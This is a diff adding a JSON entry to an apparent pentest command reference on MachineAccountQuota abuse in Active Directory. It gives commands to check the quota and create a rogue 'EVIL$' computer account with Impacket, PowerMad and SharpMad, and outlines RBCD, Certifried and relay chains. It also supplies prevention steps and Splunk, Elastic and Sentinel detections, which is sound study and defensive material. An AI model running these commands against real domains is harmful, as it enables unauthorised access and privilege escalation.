@@ -1,0 +1,105 @@
+{
+  "id": "ad-machineaccountquota",
+  "name": "MachineAccountQuota (MAQ) Abuse - Adding Computer Accounts",
+  "command": "crackmapexec ldap <dc_ip> -u <user> -p <pass> -M maq",
+  "description": "By default, any domain user can add up to 10 computer accounts (ms-DS-MachineAccountQuota=10). These machine accounts can be used for RBCD attacks, Certifried exploitation, relaying, and Kerberos abuse. Checking and exploiting MAQ is a critical first step in many AD attack chains.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Active Directory",
+  "subcategory": "Enumeration",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP MAQ abuse; AD attack chains",
+  "tags": [
+    "maq",
+    "machineaccountquota",
+    "computer-account",
+    "rbcd",
+    "impacket",
+    "addcomputer"
+  ],
+  "mitre": [
+    "T1136.002"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CHECK MAQ VALUE ===\n  # CrackMapExec:\n  crackmapexec ldap <dc_ip> -u <user> -p <pass> -M maq\n  # LDAP query:\n  ldapsearch -x -H ldap://<dc_ip> -D \"<user>@<domain>\" -w \"<pass>\" -b \"DC=<domain>,DC=local\" \"(objectClass=domain)\" ms-DS-MachineAccountQuota\n  # PowerShell:\n  Get-ADObject -Identity \"DC=<domain>,DC=local\" -Properties ms-DS-MachineAccountQuota\n\n=== ADD COMPUTER ACCOUNT ===\n  # Impacket:\n  addcomputer.py -computer-name EVIL$ -computer-pass Password123 <domain>/<user>:<pass>\n  # PowerMad:\n  New-MachineAccount -MachineAccount EVIL -Password $(ConvertTo-SecureString \"Password123\" -AsPlainText -Force)\n  # SharpMad:\n  SharpMad.exe add EVIL$ Password123\n\n=== ATTACK CHAINS REQUIRING MAQ ===\n  1. RBCD: Create machine -> delegate to target -> S4U2Self/Proxy\n  2. Certifried: Create machine -> spoof DC DNS -> request cert\n  3. Relay to LDAP: Relay auth -> create machine -> RBCD\n  4. Shadow Credentials: Machine account as delegation target\n\n=== DEFENSIVE VALUE ===\n  # Set MAQ to 0:\n  Set-ADDomain -Identity <domain> -Replace @{\"ms-DS-MachineAccountQuota\"=\"0\"}\n  # This blocks many attack chains that rely on machine account creation",
+  "examples": [
+    {
+      "label": "Check MAQ value",
+      "command": "crackmapexec ldap 192.168.1.10 -u jdoe -p Password123 -M maq"
+    },
+    {
+      "label": "Add computer account",
+      "command": "addcomputer.py -computer-name EVIL$ -computer-pass Password123 corp.local/jdoe:Password123"
+    },
+    {
+      "label": "PowerShell check MAQ",
+      "command": "Get-ADObject -Identity \"DC=corp,DC=local\" -Properties ms-DS-MachineAccountQuota"
+    }
+  ],
+  "references": [
+    {
+      "title": "MachineAccountQuota exploitation",
+      "url": "https://www.netspi.com/blog/technical-blog/network-penetration-testing/machineaccountquota-is-useful-sometimes/"
+    },
+    {
+      "title": "MITRE T1136.002",
+      "url": "https://attack.mitre.org/techniques/T1136/002/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-addcomputer",
+      "note": "addcomputer.py for creating the machine account.",
+      "rel": "next"
+    },
+    {
+      "id": "ad-impacket-rbcd",
+      "note": "RBCD attack chain using the created machine account.",
+      "rel": "next"
+    },
+    {
+      "id": "ad-certifried",
+      "note": "Certifried requires MAQ for machine account creation.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The default MachineAccountQuota of 10 allows any authenticated user to create computer accounts. These accounts can then be used as controlled principals for delegation attacks.",
+    "prerequisites": "Any domain user credentials; MAQ > 0 (default: 10).",
+    "impact": "Creates controlled machine accounts for RBCD, Certifried, relay, and other attack chains.",
+    "detection": "[MITRE T1136.002] Event 4741 (computer account created) by non-admin users.",
+    "artifacts": "Event 4741 with SubjectUserName as regular user; new computer object in default Computers OU.",
+    "splunk_spl": "index=windows EventCode=4741\n| where SubjectUserName NOT IN (\"SYSTEM\", \"Administrator\", \"*svc*\")\n| table _time, SubjectUserName, TargetUserName, SubjectDomainName",
+    "elastic_kql": "event.code:\"4741\" AND NOT user.name:(SYSTEM OR Administrator)",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4741\n| where SubjectUserName !in (\"SYSTEM\", \"Administrator\")\n| project TimeGenerated, SubjectUserName, TargetUserName, Computer",
+    "sigma_rules": "win_security_maq_computer_account_creation",
+    "prevention": "Set ms-DS-MachineAccountQuota to 0; delegate machine account creation to specific groups only; monitor Event 4741.",
+    "sources": [
+      "CRTP MAQ module",
+      "https://attack.mitre.org/techniques/T1136/002/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Non-admin computer account creation (MAQ abuse)",
+        "logic": "SecurityEvent\n| where EventID == 4741\n| where SubjectUserName !in~ (\"SYSTEM\", \"Administrator\")\n| where SubjectUserName !has \"svc\"\n| project TimeGenerated, SubjectUserName, TargetUserName, Computer",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4741"
+        ],
+        "attack": [
+          "T1136.002"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Help desk joining workstations to domain; SCCM/MDM provisioning",
+        "tuning": "Whitelist known provisioning service accounts; alert on any other user creating computer accounts"
+      }
+    ]
+  }
+}
